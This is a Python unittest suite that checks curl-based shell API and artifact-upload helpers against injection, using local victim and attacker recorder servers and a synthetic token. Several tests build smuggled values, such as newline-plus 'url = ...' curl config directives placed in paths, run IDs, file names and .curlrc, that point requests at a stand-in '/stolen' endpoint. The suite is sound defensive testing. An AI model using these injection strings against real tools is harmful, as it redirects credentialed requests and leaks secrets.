#!/usr/bin/env python3
"""Exercise the shell API helper with hostile curl values and a synthetic key."""

from __future__ import annotations

import http.server
import json
import os
from pathlib import Path
import subprocess
import tempfile
import threading
import unittest
import uuid


HELPER = Path(__file__).with_name("paperclip-api.sh")
UPLOAD_HELPER = Path(__file__).with_name("paperclip-upload-artifact.sh")


class Recorder:
    def __init__(self):
        self.requests = []
        owner = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def handle_request(self):
                size = int(self.headers.get("Content-Length", "0"))
                owner.requests.append((self.command, self.path, dict(self.headers), self.rfile.read(size)))
                if self.command == "GET" and self.path == "/api/issues/x/attachments":
                    response = b"[]"
                elif self.command == "POST" and self.path == "/api/companies/c/issues/x/attachments":
                    response = (b'{"id":"attachment-1","contentPath":"/attachments/1/content",'
                                b'"downloadPath":"/attachments/1/download","byteSize":19}')
                elif self.command == "POST" and self.path == "/api/issues/x/work-products":
                    response = b'{"id":"work-product-1"}'
                else:
                    response = b"{}"
                self.send_response(200)
                self.send_header("Content-Length", str(len(response)))
                self.end_headers()
                self.wfile.write(response)

            do_GET = handle_request
            do_POST = handle_request

            def log_message(self, *_args):
                pass

        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    @property
    def url(self):
        return "http://127.0.0.1:%d" % self.server.server_port

    def close(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=2)


class ApiHelperSecurityTest(unittest.TestCase):
    def setUp(self):
        self.scratch = tempfile.TemporaryDirectory(prefix="paperclip-api-security-")
        self.victim = Recorder()
        self.attacker = Recorder()
        self.token = "SENTINEL." + uuid.uuid4().hex + ".NOTAREALJWT"
        self.env = dict(
            os.environ,
            PAPERCLIP_API_URL=self.victim.url + "/api",
            PAPERCLIP_API_KEY=self.token,
            PAPERCLIP_RUN_ID="synthetic-run-id",
            PAPERCLIP_RUN_SCRATCH_DIR=self.scratch.name,
            PC_TEST_HELPER=os.environ.get("PC_TEST_HELPER", str(HELPER)),
        )

    def tearDown(self):
        self.victim.close()
        self.attacker.close()
        self.scratch.cleanup()

    def call(self, script, **updates):
        env = dict(self.env, **updates)
        return subprocess.run(
            ["bash", "-c", '. "$PC_TEST_HELPER"; ' + script],
            env=env,
            capture_output=True,
            text=True,
            timeout=15,
        )

    def injected_path(self, stem):
        path = self.scratch.name + '/' + stem + '"\nurl = "' + self.attacker.url + '/stolen'
        os.makedirs(os.path.dirname(path), exist_ok=True)
        return path

    def assert_one_target(self, method, path, payload=None):
        self.assertEqual(len(self.victim.requests), 1)
        self.assertEqual(len(self.attacker.requests), 0)
        request_method, request_path, headers, body = self.victim.requests[0]
        self.assertEqual((request_method, request_path), (method, path))
        self.assertEqual(headers.get("Authorization"), "Bearer " + self.token)
        if payload is not None:
            self.assertIn(payload, body)

    def upload_artifact(self, run_id, *, work_product=True):
        upload = Path(self.scratch.name) / 'artifact"\\sample.txt'
        upload.write_text("safe-upload-payload")
        env = dict(
            self.env,
            PAPERCLIP_RUN_ID=run_id,
            PAPERCLIP_HELPER_STATE_DIR=self.scratch.name + "/locks",
        )
        args = ["bash", str(UPLOAD_HELPER), str(upload), "--content-type", "text/plain",
                "--output", "json", "--company-id", "c", "--issue-id", "x"]
        if not work_product:
            args.append("--no-work-product")
        return subprocess.run(args, env=env, capture_output=True, text=True, timeout=15)

    def test_get_and_url_globbing_make_one_request(self):
        result = self.call('pc_api GET "$PC_TEST_PATH"', PC_TEST_PATH="/api/{one,two}")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("GET", "/api/{one,two}")

    def test_curl_defaults_cannot_add_an_attacker_url(self):
        curl_home = Path(self.scratch.name) / "curl-home"
        curl_home.mkdir()
        (curl_home / ".curlrc").write_text('url = "' + self.attacker.url + '/stolen"\n')
        result = self.call("pc_api GET /api/agents/me", CURL_HOME=str(curl_home))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("GET", "/api/agents/me")

    def test_post_reads_body_file_with_quote_and_backslash(self):
        body_file = Path(self.scratch.name) / 'body"\\sample.json'
        body_file.write_text('{"value":"safe"}')
        result = self.call(
            'pc_api POST /api/issues/x/comments "$PC_TEST_BODY"',
            PC_TEST_BODY=str(body_file),
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("POST", "/api/issues/x/comments", b'"value":"safe"')

    def test_upload_reads_file_with_quote_and_backslash(self):
        upload = Path(self.scratch.name) / 'upload"\\sample.txt'
        upload.write_text("safe-upload-payload")
        result = self.call(
            'pc_api_upload /api/issues/x/attachments "$PC_TEST_FILE" text/plain',
            PC_TEST_FILE=str(upload),
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("POST", "/api/issues/x/attachments", b"safe-upload-payload")

    def test_artifact_uploader_reads_file_with_quote_and_backslash(self):
        run_id = 'synthetic"\\run-id'
        result = self.upload_artifact(run_id)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(len(self.victim.requests), 3)
        self.assertEqual(len(self.attacker.requests), 0)
        self.assertEqual([request[:2] for request in self.victim.requests], [
            ("GET", "/api/issues/x/attachments"),
            ("POST", "/api/companies/c/issues/x/attachments"),
            ("POST", "/api/issues/x/work-products"),
        ])
        for _, _, headers, _ in self.victim.requests:
            self.assertEqual(headers.get("Authorization"), "Bearer " + self.token)
            self.assertEqual(headers.get("X-Paperclip-Run-Id"), run_id)
        self.assertIn(b"safe-upload-payload", self.victim.requests[1][3])
        self.assertEqual(json.loads(self.victim.requests[2][3])["createdByRunId"], run_id)

    def test_artifact_uploader_rejects_curl_config_directive_before_network(self):
        run_id = 'synthetic"\nurl = "' + self.attacker.url + '/stolen'
        result = self.upload_artifact(run_id)
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("PAPERCLIP_RUN_ID contains a control character", result.stderr)
        self.assertNotIn(self.token, result.stderr)
        self.assertEqual(self.victim.requests, [])
        self.assertEqual(self.attacker.requests, [])

    def test_artifact_uploader_rejects_each_header_control_before_network(self):
        for control in ("\r", "\n", "\t", "\x1f", "\x7f"):
            with self.subTest(control=repr(control)):
                result = self.upload_artifact("run" + control + "id")
                self.assertNotEqual(result.returncode, 0)
                self.assertEqual(self.victim.requests, [])
                self.assertEqual(self.attacker.requests, [])

    def test_path_cannot_add_an_attacker_url(self):
        injected = '/api/agents/me"\nurl = "' + self.attacker.url + "/stolen"
        self.call('pc_api GET "$PC_TEST_PATH"', PC_TEST_PATH=injected)
        self.assertEqual(len(self.attacker.requests), 0)
        self.assertLessEqual(len(self.victim.requests), 1)

    def test_api_url_cannot_add_an_attacker_url(self):
        injected = self.victim.url + '/api"\nurl = "' + self.attacker.url + "/stolen"
        self.call("pc_api GET /api/agents/me", PAPERCLIP_API_URL=injected)
        self.assertEqual(len(self.attacker.requests), 0)
        self.assertLessEqual(len(self.victim.requests), 1)

    def test_timeout_cannot_add_an_attacker_url(self):
        injected = '4\nurl = "' + self.attacker.url + '/stolen"'
        self.call("pc_api GET /api/agents/me", PC_API_MAX_TIME=injected)
        self.assertEqual(len(self.attacker.requests), 0)
        self.assertLessEqual(len(self.victim.requests), 1)

    def test_body_file_path_cannot_add_an_attacker_url(self):
        body_file = self.injected_path("body")
        Path(body_file).write_text('{"value":"safe"}')
        result = self.call(
            'pc_api POST /api/issues/x/comments "$PC_TEST_BODY"',
            PC_TEST_BODY=body_file,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("POST", "/api/issues/x/comments", b'"value":"safe"')

    def test_output_path_cannot_add_an_attacker_url(self):
        scratch = self.injected_path("output")
        os.makedirs(scratch, exist_ok=True)
        result = self.call(
            "pc_api GET /api/agents/me",
            PAPERCLIP_RUN_SCRATCH_DIR=scratch,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assert_one_target("GET", "/api/agents/me")

    def test_upload_form_cannot_add_an_attacker_url(self):
        injected_file = self.injected_path("upload")
        Path(injected_file).write_text("safe-upload-payload")
        result = self.call(
            'pc_api_upload /api/issues/x/attachments "$PC_TEST_FILE" text/plain',
            PC_TEST_FILE=injected_file,
        )
        self.assertEqual(len(self.attacker.requests), 0)
        if result.returncode == 0:
            self.assert_one_target("POST", "/api/issues/x/attachments", b"safe-upload-payload")


if __name__ == "__main__":
    unittest.main()
